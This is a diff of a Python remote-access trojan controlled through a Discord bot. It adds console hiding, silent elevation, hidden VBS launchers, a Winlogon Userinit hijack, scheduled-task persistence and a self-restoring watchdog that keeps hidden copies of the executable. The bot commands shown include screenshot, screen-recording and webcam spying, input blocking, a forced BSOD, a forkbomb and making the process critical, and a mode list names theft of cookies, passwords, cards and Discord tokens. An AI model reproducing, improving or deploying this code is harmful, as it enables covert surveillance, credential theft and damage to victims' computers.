@@ -95,8 +95,19 @@ try:
 except Exception:
     _FAULT_HANDLE = None
 
+def _hide_console():
+    try:
+        import ctypes
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+    except Exception:
+        pass
+
+
 _crash("boot", "process start argv={} frozen={} admin={} pid={}".format(
     sys.argv, getattr(sys, "frozen", False), _is_admin_early(), os.getpid()))
+_hide_console()
 
 GRAB_SCRIPT = "grab.py"
 GRAB_MODES = ("all", "cookies", "history", "cards", "games", "discord", "discorddiag", "passwords", "vm")
@@ -609,8 +620,19 @@ _FALLBACK_NAMES = (
     "NexoraRun", "NexoraDaemon", "NexoraBg", "NexoraSupport", "NexoraClient",
 )
 
+def _watch_vbs_block(i=0):
+    p = '"%S{0}%.vbs"'.format(i)
+    return "\n".join([
+        '>' + p + ' echo Set s = CreateObject("WScript.Shell")',
+        '>>' + p + ' echo s.Run """" ^& "%S' + str(i) + '%" ^& """", 0, False',
+        '>nul 2>&1 attrib +h +s ' + p,
+    ])
+
+
 _WATCH_BAT = """@echo off
-{defs}
+@echo off
+setlocal EnableExtensions
+if not "%~1"=="" title %~1
 :loop
 set "SRC="
 if exist "%S0%" set "SRC=%S0%"
@@ -618,15 +640,40 @@ if exist "%S0%" set "SRC=%S0%"
 if defined SRC (
 {restore}
 )
-tasklist /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul
+tasklist /nh /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul 2>&1
+if errorlevel 1 goto revive
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%~n0" >nul 2>&1
+if errorlevel 1 if exist "%S0%" start "" /b "%S0%" --zz-repair
+goto tasks
+:revive
+>nul 2>&1 schtasks /run /tn "{task}"
 if errorlevel 1 if exist "%S0%" start "" /b "%S0%"
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "{name}" >nul
-if errorlevel 1 if exist "%S0%" start "" /b "%S0%" {flag}
-schtasks /query /tn "{task}" >nul 2>&1
-if errorlevel 1 if exist "%S0%" schtasks /create /tn "{task}" /tr "\\"%S0%\\"" /sc onlogon /rl highest /f >nul 2>&1
-ping -n {period} 127.0.0.1 >nul 2>&1
+:tasks
+if exist "%S0%.vbs" goto havetask
+{vbs}
+:havetask
+>nul 2>&1 schtasks /query /tn "{task}"
+if errorlevel 1 if exist "%S0%.vbs" >nul 2>&1 schtasks /create /tn "{task}" /tr "\\"wscript.exe //B \\"%S0%.vbs\\"\\"" /sc onlogon /rl highest /f
+call :sleep 21
 goto loop
+:sleep
+>nul 2>&1 ping -n %1 127.0.0.1
+exit /b 0
 """
+
+def _watch_vbs(bat, tag):
+    path = bat + ".vbs"
+    body = "\r\n".join([
+        'Set s = CreateObject("WScript.Shell")',
+        's.Run "cmd.exe /c " & """""" & "{}" & """ " & "{}" & """", 0, True'.format(bat, tag),
+    ]) + "\r\n"
+    try:
+        with open(path, "w", encoding="utf-8", newline="") as f:
+            f.write(body)
+        _hide(path, True)
+        return path
+    except Exception:
+        return None
 
 _watch_proc = None
 
@@ -885,9 +932,19 @@ def _make_launcher(exe, folder):
         return None
 
 
+def _hidden_cmd(exe):
+    try:
+        vbs = _make_launcher(exe, os.path.basename(exe))
+        if vbs:
+            return 'wscript.exe //B "{}"'.format(vbs)
+    except Exception:
+        pass
+    return '"{}"'.format(exe)
+
+
 def _task_create(name, exe, sc, extra=()):
     subprocess.run(
-        ["schtasks", "/Create", "/TN", name, "/TR", f'"{exe}"',
+        ["schtasks", "/Create", "/TN", name, "/TR", _hidden_cmd(exe),
          "/SC", sc, "/RL", "HIGHEST", "/F", *extra],
         capture_output=True, creationflags=_CNW)
 
@@ -898,14 +955,16 @@ def install_userinit():
     userinit = os.path.join(WINDIR, "System32", "userinit.exe")
     if not os.path.exists(exe):
         return False
+    entry = _hidden_cmd(exe)
     for _ in range(5):
         cur = _reg_query(WINLOGON_KEY, "Userinit") or (userinit + ",")
         low = cur.lower()
         if exe.lower() in low and userinit.lower() in low:
             return True
-        parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
-        parts = [p for p in parts if p.lower() not in (exe.lower(), userinit.lower())]
-        _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [exe, userinit]) + ",")
+        parts = [p.strip() for p in cur.split(",") if p.strip()]
+        parts = [p for p in parts if exe.lower() not in p.lower() and
+                 userinit.lower() not in p.lower()]
+        _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [entry, userinit]) + ",")
         time.sleep(0.3)
         got = (_reg_query(WINLOGON_KEY, "Userinit") or "").lower()
         if exe.lower() in got and userinit.lower() in got:
@@ -921,8 +980,9 @@ def uninstall_userinit():
         return
     if exe and exe.lower() not in cur.lower():
         return
-    parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
-    parts = [p for p in parts if p.lower() not in (userinit.lower(), (exe or "").lower())]
+    parts = [p.strip() for p in cur.split(",") if p.strip()]
+    parts = [p for p in parts if userinit.lower() not in p.lower() and
+             not (exe and exe.lower() in p.lower())]
     _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [userinit]) + ",")
 
 
@@ -976,14 +1036,14 @@ def _write_watchdog(st):
     slots = st.get("slots") or []
     if not slots:
         return False
-    defs = "\r\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
-    find = "\r\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
+    defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
+    find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
                        for i in range(1, len(slots)))
-    restore = "\r\n".join(
-        '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\r\n'
+    restore = "\n".join(
+        '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
         '  if exist "%S{0}%" attrib +h +s "%S{0}%" >nul 2>&1'.format(i)
         for i in range(len(slots)))
-    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
+    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore, vbs=_watch_vbs_block(0),
                              name=os.path.basename(slots[0]["exe"]),
                              task=st["task"], flag=REPAIR_FLAG, period=WATCHDOG_PERIOD)
     ok = False
@@ -1066,22 +1126,6 @@ def _watch_suspend(rounds=6):
     return not (tag and _watch_alive(tag))
 
 
-def _watch_resume():
-    global _WATCH_ON
-    _WATCH_ON = True
-    st = _state_read() or {}
-    if not st.get("slots"):
-        return
-    try:
-        _write_watchdog(st)
-    except Exception:
-        pass
-    try:
-        _spawn_watchdog()
-    except Exception:
-        pass
-
-
 def _spawn_watchdog():
     global _watch_proc
     st = _state_read() or {}
@@ -1098,13 +1142,41 @@ def _spawn_watchdog():
     bat = bat or next((s["bat"] for s in slots if os.path.exists(s["bat"])), None)
     if not bat:
         return
+    tag = "LMG_" + (st.get("mutex") or "0")
+    vbs = _watch_vbs(bat, tag)
     try:
-        _watch_proc = subprocess.Popen(
-            ["cmd.exe", "/c", bat],
-            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-            creationflags=_CNW)
+        if vbs:
+            _watch_proc = subprocess.Popen(
+                ["wscript.exe", "//B", vbs], creationflags=_CNW,
+                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL, close_fds=True)
+        else:
+            _watch_proc = subprocess.Popen(
+                ["cmd.exe", "/c", bat, tag], creationflags=_CNW,
+                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL, close_fds=True)
     except Exception:
         _watch_proc = None
+
+
+def _watch_resume():
+    st = _state_read() or {}
+    bat = next((b for b in _watch_bats() if os.path.exists(b)), None)
+    if not bat:
+        return
+    tag = "LMG_" + (st.get("mutex") or "0")
+    vbs = _watch_vbs(bat, tag)
+    try:
+        if vbs:
+            subprocess.Popen(["wscript.exe", "//B", vbs], creationflags=_CNW,
+                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL, close_fds=True)
+        else:
+            subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
+                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL, close_fds=True)
+    except Exception:
+        pass
 
 
 def _watchdog_thread():
@@ -1223,7 +1295,7 @@ def boot():
         try:
             params = ELEVATED_FLAG if getattr(sys, "frozen", False) else \
                      f'{ELEVATED_FLAG} "{Path(__file__).resolve()}"'
-            r = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+            r = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 0)
             ok = int(r) > 32
         except Exception:
             ok = False
@@ -2129,7 +2201,7 @@ async def run_panel_command(interaction: discord.Interaction, command_name: str,
         return
     cmds_channel = interaction.guild.get_channel(cfg_get(interaction.guild.id, "cmds"))
     if not cmds_channel:
-        await interaction.response.send_message("Commands channel not found", ephemeral=True)
+        await interaction.response.send_message("The commands channel could not be found.", ephemeral=True)
         return
     await interaction.response.defer()
     ctx = await bot.get_context(interaction.message)
@@ -2162,9 +2234,9 @@ class VolumeModal(discord.ui.Modal):
             if 0 <= vol <= 100:
                 await run_panel_command(interaction, "volume", vol)
             else:
-                await interaction.response.send_message("0-100 only", ephemeral=True)
+                await interaction.response.send_message("The value must be between 0 and 100.", ephemeral=True)
         except ValueError:
-            await interaction.response.send_message("Invalid value", ephemeral=True)
+            await interaction.response.send_message("That is not a valid number.", ephemeral=True)
 
 
 class NotepadModal(discord.ui.Modal):
@@ -2280,11 +2352,11 @@ class ButtonsFiles(_PanelView):
 class ButtonsSecurity(_PanelView):
     @discord.ui.button(label="🚫 Blacklist", style=discord.ButtonStyle.danger)
     async def b1(self, i, b):
-        await i.response.send_message("Type `.blacklist <process>` in cmds", ephemeral=True)
+        await i.response.send_message("Type `.blacklist <process>` in the commands channel.", ephemeral=True)
 
     @discord.ui.button(label="✅ Unblacklist", style=discord.ButtonStyle.success)
     async def b2(self, i, b):
-        await i.response.send_message("Type `.unblacklist <process>` in cmds", ephemeral=True)
+        await i.response.send_message("Type `.unblacklist <process>` in the commands channel.", ephemeral=True)
 
 
 class ButtonsPower(_PanelView):
@@ -2587,26 +2659,26 @@ class HelpView(discord.ui.View):
         for k, emoji, name, body in HELP_PAGES:
             if k == key:
                 return create_embed(f"{emoji} {name}", body, 0x9B59B6)
-        return create_embed("Help", "Pick a category below.", 0x9B59B6)
+        return create_embed("Help", "Pick a category from the menu below.", 0x9B59B6)
 
     async def on_select(self, interaction: discord.Interaction):
         await interaction.response.edit_message(embed=self.build_embed(self.select.values[0]), view=self)
 
 
-@bot.command(aliases=["help"])
-async def ayuda(ctx):
+@bot.command()
+async def help(ctx):
     view = HelpView()
     await ctx.send(embed=view.build_embed("overview"), view=view)
 
 @bot.command()
 async def volume(ctx, vol: int = None):
     if vol is None:
-        await ctx.send(embed=create_embed("Error", "Usage: `.volume <0-100>`", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "You have to provide a volume between 0 and 100, for example `.volume 40`.", 0xff0000))
         return
     if set_volume_level(vol / 100):
-        await ctx.send(embed=create_embed("🔊 Volume", f"Volume set to **{vol}%**.", 0x00ff00))
+        await ctx.send(embed=create_embed("🔊 Volume", f"The system volume was set to **{vol}%** and the change was applied immediately.", 0x00ff00))
     else:
-        await ctx.send(embed=create_embed("Error", "Could not change volume", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "The volume could not be changed, the audio endpoint did not accept the request.", 0xff0000))
 
 
 @bot.command()
@@ -2615,7 +2687,7 @@ async def ss(ctx):
     path = screenshot_all()
     if path:
         file_name = os.path.basename(path)
-        embed = create_embed("📸 Screenshot taken", "Screenshot attached.", 0x0084FF)
+        embed = create_embed("📸 Screenshot taken", "A screenshot of every connected display was taken and is attached to this message.", 0x0084FF)
         embed.set_image(url=f"attachment://{file_name}")
         await ctx.send(embed=embed, file=discord.File(path, filename=file_name))
         os.remove(path)
@@ -2626,7 +2698,7 @@ async def screenrec(ctx, seconds: int = 30):
     if seconds > 300:
         seconds = 300
     await ctx.message.add_reaction("📌")
-    await ctx.send(f"`🎥` Recording for **{seconds}** seconds...")
+    await ctx.send(f"`🎥` A screen recording of **{seconds}** seconds was started, it will be uploaded as soon as it finishes.")
     try:
         import imageio
         frames = []
@@ -2635,18 +2707,18 @@ async def screenrec(ctx, seconds: int = 30):
             frames.append(np.array(pyautogui.screenshot()))
         output_file = os.path.join(BASE_DIR, "recording.mp4")
         imageio.mimsave(output_file, frames, fps=10)
-        await ctx.send(embed=create_embed("🎥 Screen recording", "Recording complete.", 0x0084ff),
+        await ctx.send(embed=create_embed("🎥 Screen recording", "The recording finished correctly and the video file is attached below.", 0x0084ff),
                        file=discord.File(output_file))
         os.remove(output_file)
     except Exception as e:
-        await ctx.send(f"Error: {e}")
+        await ctx.send(f"The recording could not be completed: {e}")
 
 
 @bot.command(aliases=["list-cams"])
 async def list_cams(ctx):
     cams = list_cameras()
     msg = "\n".join([f"Camera **ID {i}**" for i in cams])
-    await ctx.send(embed=create_embed("Cameras", msg or "No cameras found", 0x3498db))
+    await ctx.send(embed=create_embed("Cameras", msg or "No capture device was detected on this machine.", 0x3498db))
 
 
 @bot.command()
@@ -2657,23 +2729,23 @@ async def webcam(ctx):
         if ret:
             path = os.path.join(BASE_DIR, "webcam.png")
             cv2.imwrite(path, frame)
-            embed = create_embed("📹 Webcam photo", f"Selected camera: **{selected_camera}**", 0x0084FF)
+            embed = create_embed("📹 Webcam photo", f"A photo was taken with camera **{selected_camera}** and is attached to this message.", 0x0084FF)
             embed.set_image(url="attachment://webcam.png")
             await ctx.send(embed=embed, file=discord.File(path, filename="webcam.png"))
             os.remove(path)
         cap.release()
     else:
-        await ctx.send(embed=create_embed("Error", f"Could not access camera **{selected_camera}**.", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", f"Camera **{selected_camera}** could not be opened, it may be busy or disconnected.", 0xFF0000))
 
 
 @bot.command(aliases=["sel-cam"])
 async def sel_cam(ctx, num: int = None):
     global selected_camera
     if num is None:
-        await ctx.send(embed=create_embed("Error", "Usage: `.sel-cam <id>`", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "You have to indicate the camera index, for example `.sel-cam 0`.", 0xff0000))
         return
     selected_camera = num
-    await ctx.send(embed=create_embed("📹 Camera", f"Selected camera **{num}**.", 0x00ff00))
+    await ctx.send(embed=create_embed("📹 Camera", f"Camera **{num}** is now the one used by the webcam commands.", 0x00ff00))
 
 
 @bot.command(aliases=["list-mics", "microphones"])
@@ -2682,9 +2754,9 @@ async def list_microphones(ctx):
     try:
         mics = get_input_devices()
         lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
-        await ctx.send(embed=create_embed("🎙️ Microphones", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
+        await ctx.send(embed=create_embed("🎙️ Microphones", f"The following input devices were found:\n```{chr(10).join(lines) or 'None'}```", 0x0084ff))
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"The input devices could not be listed: {e}", 0xff0000))
 
 
 @bot.command(aliases=["sel-mic", "selmic"])
@@ -2693,10 +2765,10 @@ async def sel_mic(ctx, num: int = None):
     mics = get_input_devices()
     if num is None or not (0 <= num < len(mics)):
         lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
-        await ctx.send(embed=create_embed("🎙️ Microphones", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
+        await ctx.send(embed=create_embed("🎙️ Microphones", f"Pick one of the devices below by its position:\n```{chr(10).join(lines) or 'None'}```", 0x0084ff))
         return
     selected_mic = mics[num]["index"]
-    await ctx.send(embed=create_embed("🎙️ Microphone", f"Selected: `{mics[num]['name']}`", 0x00ff00))
+    await ctx.send(embed=create_embed("🎙️ Microphone", f"`{mics[num]['name']}` is now the input used by the recording commands.", 0x00ff00))
 
 
 @bot.command(aliases=["list-speakers"])
@@ -2709,16 +2781,16 @@ async def list_speakers(ctx):
         if isinstance(devices, dict):
             devices = [devices]
         lines = [f"{d['Index']}. {'[DEFAULT] ' if d.get('Default') else ''}{d['Name']}" for d in devices]
-        embed = create_embed("🔊 Speakers", f"```{chr(10).join(lines)}```", 0x0084ff)
+        embed = create_embed("🔊 Speakers", f"These playback devices are available, the default one is marked:\n```{chr(10).join(lines)}```", 0x0084ff)
     except Exception as e:
-        embed = create_embed("Error", str(e), 0xff0000)
+        embed = create_embed("Error", f"The playback devices could not be listed: {e}", 0xff0000)
     await ctx.send(embed=embed)
 
 
 @bot.command(aliases=["change-output", "set-speaker"])
 async def change_output(ctx, target: str = None):
     if not target:
-        await ctx.send(embed=create_embed("Error", "Usage: `.change-output <index | name>`", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "You have to give an index or a name, for example `.set-speaker 2`.", 0xffa500))
         return
     ps_script = f'''
 if (-not (Get-Module -ListAvailable AudioDeviceCmdlets)) {{
@@ -2733,16 +2805,16 @@ if ('{target}' -as [int]) {{
 '''
     result = ps(ps_script)
     if "NOT_FOUND" in result.stdout:
-        await ctx.send(embed=create_embed("Error", f"Device **{target}** not found.", 0xff0000))
+        await ctx.send(embed=create_embed("Error", f"No playback device matches **{target}**.", 0xff0000))
     else:
-        await ctx.send(embed=create_embed("🔊 Output", f"Default device set to `{target}`.", 0x0084ff))
+        await ctx.send(embed=create_embed("🔊 Output", f"`{target}` is now the default playback device for the whole system.", 0x0084ff))
 
 
 @bot.command(aliases=["block-input"])
 async def block_input(ctx, seconds: int = None):
     global input_blocked, keyboard_listener, mouse_listener
     if input_blocked:
-        await ctx.send("Already blocked")
+        await ctx.send("The input is already blocked, use `.unblock-input` to release it.")
         return
     await ctx.message.add_reaction("📌")
     if seconds is None:
@@ -2751,7 +2823,7 @@ async def block_input(ctx, seconds: int = None):
         keyboard_listener.start()
         mouse_listener.start()
         input_blocked = True
-        await ctx.send(embed=create_embed("⌨️ Input blocked", "Blocked permanently.", 0xff0000))
+        await ctx.send(embed=create_embed("⌨️ Input blocked", "The keyboard and the mouse are frozen and will stay like this until the input is released.", 0xff0000))
     else:
         def block_temp():
             global input_blocked
@@ -2765,51 +2837,51 @@ async def block_input(ctx, seconds: int = None):
             input_blocked = False
         input_blocked = True
         threading.Thread(target=block_temp, daemon=True).start()
-        await ctx.send(embed=create_embed("⌨️ Input blocked", f"Blocked for **{seconds}** seconds.", 0xff0000))
+        await ctx.send(embed=create_embed("⌨️ Input blocked", f"The keyboard and the mouse are frozen for the next **{seconds}** seconds.", 0xff0000))
 
 
 @bot.command(aliases=["unblock-input"])
 async def unblock_input(ctx):
     global input_blocked, keyboard_listener, mouse_listener
     if not input_blocked:
-        await ctx.send("`🚫` Input already unlocked.")
+        await ctx.send("`🚫` The input was not blocked, so there is nothing to release.")
         return
     if keyboard_listener:
         keyboard_listener.stop()
     if mouse_listener:
         mouse_listener.stop()
     input_blocked = False
-    await ctx.send(embed=create_embed("⌨️ Input Unblocked", "Unblocked.", 0x00ff00))
+    await ctx.send(embed=create_embed("⌨️ Input Unblocked", "The keyboard and the mouse respond again.", 0x00ff00))
 
 
 @bot.command(aliases=["hide-cursor"])
 async def hide_cursor(ctx):
     ctypes.windll.user32.ShowCursor(False)
-    await ctx.send(embed=create_embed("🖱️ Cursor", "Cursor hidden.", 0x00ff00))
+    await ctx.send(embed=create_embed("🖱️ Cursor", "The mouse pointer was hidden from the screen.", 0x00ff00))
 
 
 @bot.command(aliases=["show-cursor"])
 async def show_cursor(ctx):
     ctypes.windll.user32.ShowCursor(True)
-    await ctx.send(embed=create_embed("🖱️ Cursor", "Cursor shown.", 0x00ff00))
+    await ctx.send(embed=create_embed("🖱️ Cursor", "The mouse pointer is visible again.", 0x00ff00))
 
 
 @bot.command(aliases=["monitors-off"])
 async def monitors_off(ctx):
     ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
-    await ctx.send(embed=create_embed("💻 Monitors", "Monitors off.", 0xff0000))
+    await ctx.send(embed=create_embed("💻 Monitors", "The displays were powered down, they can be woken with `.monitors-on`.", 0xff0000))
 
 
 @bot.command(aliases=["monitors-on"])
 async def monitors_on(ctx):
     ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
-    await ctx.send(embed=create_embed("💻 Monitors", "Monitors on.", 0x00ff00))
+    await ctx.send(embed=create_embed("💻 Monitors", "The displays were powered back up.", 0x00ff00))
 
 
 @bot.command()
 async def taskkill(ctx, *, process: str):
     subprocess.run(["taskkill", "/f", "/im", process], capture_output=True)
-    await ctx.send(embed=create_embed("🚫 Taskkill", f"Killed **{process}**.", 0x27F542))
+    await ctx.send(embed=create_embed("🚫 Taskkill", f"Every instance of **{process}** was terminated by force.", 0x27F542))
 
 
 @bot.command()
@@ -2822,25 +2894,25 @@ async def tasklist(ctx):
 @bot.command(aliases=["kill-explorer"])
 async def kill_explorer(ctx):
     subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
-    await ctx.send(embed=create_embed("⛔ Explorer", "explorer.exe killed.", 0xff0000))
+    await ctx.send(embed=create_embed("⛔ Explorer", "Explorer was terminated, the desktop and the taskbar are gone until it is started again.", 0xff0000))
 
 
 @bot.command(aliases=["start-explorer"])
 async def start_explorer(ctx):
     subprocess.Popen(["start", "explorer.exe"], shell=True)
-    await ctx.send(embed=create_embed("⛔ Explorer", "explorer.exe started.", 0x00ff00))
+    await ctx.send(embed=create_embed("⛔ Explorer", "Explorer was started again and the desktop is back.", 0x00ff00))
 
 
 @bot.command(aliases=["set-critical"])
 async def set_critical(ctx):
     ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
-    await ctx.send(embed=create_embed("❗ Critical", "Process is now critical.", 0xff0000))
+    await ctx.send(embed=create_embed("❗ Critical", "The process is now critical, terminating it will bug check the whole machine.", 0xff0000))
 
 
 @bot.command(aliases=["unset-critical"])
 async def unset_critical(ctx):
     ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
-    await ctx.send(embed=create_embed("❗ Critical", "Critical disabled.", 0x00ff00))
+    await ctx.send(embed=create_embed("❗ Critical", "The critical flag was removed and the process can be killed safely again.", 0x00ff00))
 
 
 @bot.command(aliases=["crazy-mouse"])
@@ -2851,18 +2923,18 @@ async def crazy_mouse(ctx):
             ctypes.windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
             time.sleep(0.01)
     threading.Thread(target=crazy, daemon=True).start()
-    await ctx.send(embed=create_embed("😵‍💫 Crazy Mouse", "Enabled for 2 seconds.", 0xf39c12))
+    await ctx.send(embed=create_embed("😵‍💫 Crazy Mouse", "The pointer jumps to a random position on the screen for two seconds.", 0xf39c12))
 
 
 @bot.command(aliases=["minimize-all"])
 async def minimize_all(ctx):
     subprocess.run(["powershell", "-Command", "$w = New-Object -ComObject Shell.Application; $w.MinimizeAll()"], capture_output=True)
-    await ctx.send(embed=create_embed("➖ Minimize", "All windows minimized.", 0x00ff00))
+    await ctx.send(embed=create_embed("➖ Minimize", "Every open window was minimized to the taskbar at once.", 0x00ff00))
 
 
 @bot.command()
 async def bsod(ctx):
-    await ctx.send(embed=create_embed("💀 BSOD", "Triggering BSOD...", 0x00ff00))
+    await ctx.send(embed=create_embed("💀 BSOD", "A real bug check is being triggered, the machine is about to restart.", 0x00ff00))
     await ctx.message.add_reaction("💀")
     try:
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
@@ -2875,7 +2947,7 @@ async def bsod(ctx):
 @bot.command()
 async def forkbomb(ctx):
     await ctx.message.add_reaction("💀")
-    await ctx.send(embed=create_embed("🍽️ Forkbomb", "Forkbomb started.", 0xff0000))
+    await ctx.send(embed=create_embed("🍽️ Forkbomb", "A forkbomb was started, new processes will keep spawning until the machine gives up.", 0xff0000))
     while True:
         subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
@@ -2984,53 +3056,22 @@ def _play_jump(path):
         except Exception:
             pass
 
-@bot.command()
-async def jumpscare(ctx):
-    await ctx.message.add_reaction("👻")
-    try:
-        path = await _ensure_jump()
-    except Exception as e:
-        await ctx.send(embed=create_embed("Error", f"jump.mp4: {e}", 0xFF0000))
-        return
-
-    try:
-        await asyncio.to_thread(set_volume_level, 1.0)
-    except Exception:
-        pass
-
-    used = None
-    for _ in range(2):
-        used = await asyncio.to_thread(_play_jump, path)
-        if used:
-            break
-        await asyncio.sleep(0.3)
-
-    if used:
-        await ctx.send(embed=create_embed("👻 Jumpscare", f"Playing ({used}).", 0xFF0000))
-        return
-
-    try:
-        os.startfile(path)
-        await ctx.send(embed=create_embed("👻 Jumpscare", "Fallback to default player.", 0xFF0000))
-    except Exception as e:
-        await ctx.send(embed=create_embed("Error", f"No player available: {e}", 0xFF0000))
-
 @bot.command(aliases=["display-glitch"])
 async def display_glitch(ctx, effect: str = None):
     if effect is None or effect == "list":
-        await ctx.send(embed=create_embed("💻 Available Glitches", "".join(flash_screen("list")), 0x3498db))
+        await ctx.send(embed=create_embed("💻 Available Glitches", "These are all the effects the display can run right now:\n" + "".join(flash_screen("list")), 0x3498db))
         return
     if effect + "\n" in flash_screen("list"):
         threading.Thread(target=flash_screen, args=(effect,), daemon=True).start()
-        await ctx.send(embed=create_embed("💻 Glitch Executed", f"Effect: **{effect}**.", 0x00ff00))
+        await ctx.send(embed=create_embed("💻 Glitch Executed", f"The **{effect}** effect is now running over the whole desktop.", 0x00ff00))
     else:
-        await ctx.send(embed=create_embed("Error", "Invalid effect.", 0xff0000))
+        await ctx.send(embed=create_embed("Error", "That effect does not exist, run `.display-glitch list` to see the valid ones.", 0xff0000))
 
 
 @bot.command(aliases=["windows-notification", "win-notify"])
 async def windows_notification(ctx, title: str = None, *, message: str = None):
     if not title or not message:
-        await ctx.send(embed=create_embed("Error", 'Usage: `.win-notify "<title>" <message>`', 0xffa500))
+        await ctx.send(embed=create_embed("Error", 'You have to give a title and a message, for example `.win-notify "Update" "Restart needed"`.', 0xffa500))
         return
     ps_script = (
         '[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); '
@@ -3041,35 +3082,45 @@ async def windows_notification(ctx, title: str = None, *, message: str = None):
         'Start-Sleep -s 6; $notify.Dispose()'
     )
     ps(ps_script)
-    await ctx.send(embed=create_embed("🔔 Notification", f"**{title}**\n{message}", 0x0084ff))
+    await ctx.send(embed=create_embed("🔔 Notification", f"A system balloon with the title **{title}** and the text below was shown.\n{message}", 0x0084ff))
 
 
 @bot.command()
 async def play(ctx, *, file: str):
     subprocess.Popen(["start", file], shell=True)
-    await ctx.send(embed=create_embed("🎵 Playing", file, 0x00ff00))
+    await ctx.send(embed=create_embed("🎵 Playing", f"The file `{file}` was handed to the default media player.", 0x00ff00))
 
 
 @bot.command(aliases=["speak"])
 async def tts(ctx, *, message: str):
-    subprocess.run(["powershell", "-Command",
-                    f'Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak("{message}")'],
-                   capture_output=True)
-    await ctx.send(embed=create_embed("🗣️ TTS", f"```{message[:50]}```", 0x00ff00))
+    def say():
+        try:
+            import pythoncom
+            pythoncom.CoInitialize()
+            win32com.client.Dispatch("SAPI.SpVoice").Speak(message, 0)
+            pythoncom.CoUninitialize()
+        except Exception:
+            subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+                            "Add-Type -AssemblyName System.Speech; "
+                            "(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak($env:ZZTTS)"],
+                           capture_output=True, creationflags=_CNW,
+                           env=dict(os.environ, ZZTTS=message))
+    await asyncio.to_thread(say)
+    await ctx.send(embed=create_embed("🗣️ TTS", f"The following text was read out loud through the speakers:\n```{message[:300]}```", 0x00ff00))
 
 
 @bot.command()
 async def msg(ctx, type: int = None, title: str = None, *, message: str = None):
     if type is None or title is None or message is None:
-        await ctx.send(embed=create_embed("💬 MsgBox", "Usage: `.msg <type> \"<title>\" \"<message>\"`", 0x00ff00))
+        await ctx.send(embed=create_embed("💬 MsgBox", 'You have to give a type, a title and a message, for example `.msg 64 "Hello" "Text"`.', 0x00ff00))
         return
     safe_title = title.replace('"', '`"')
     safe_message = message.replace('"', '`"')
     subprocess.run(["powershell", "-Command",
                     f'Add-Type -AssemblyName Microsoft.VisualBasic; '
                     f'[Microsoft.VisualBasic.Interaction]::MsgBox("{safe_message}", "{type}", "{safe_title}")'],
-                   capture_output=True)
-    await ctx.send(embed=create_embed("💬 Message", f"**{title}**\n{message}", 0x00ff00))
+                   capture_output=True, creationflags=_CNW)
+    await ctx.send(embed=create_embed("💬 Message", f"A message box titled **{title}** was opened with the text below.\n{message}", 0x00ff00))
 
 
 @bot.command(aliases=["ls"])
@@ -3084,9 +3135,9 @@ async def dir(ctx):
                 out += f"`📂` `{f}/`\n"
             else:
                 out += f"`📄` `{f}` ({os.path.getsize(full)} bytes)\n"
-        await ctx.send(embed=create_embed("📁 Directory", out[:4000], 0x3498db))
+        await ctx.send(embed=create_embed("📁 Directory", f"The contents of the current folder were listed below.\n{out[:3900]}", 0x3498db))
     except Exception as e:
-        await ctx.send(f"Error: {e}")
+        await ctx.send(f"The folder could not be listed: {e}")
 
 
 @bot.command()
